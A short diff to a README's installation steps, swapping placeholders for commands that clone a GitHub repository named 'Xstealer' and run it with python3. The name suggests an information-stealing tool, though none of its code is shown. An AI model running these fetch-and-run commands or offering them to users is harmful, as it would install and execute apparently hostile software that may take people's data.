@@ -13,7 +13,7 @@ Requierments.txt downloaded succesfully.
 
 
 ```bash
-git clone 
-cd (file name)
-python (file name)
+git clone https://github.com/XPSsss1/Xstealer.git
+cd Xstealer
+python3 Xstealer
 
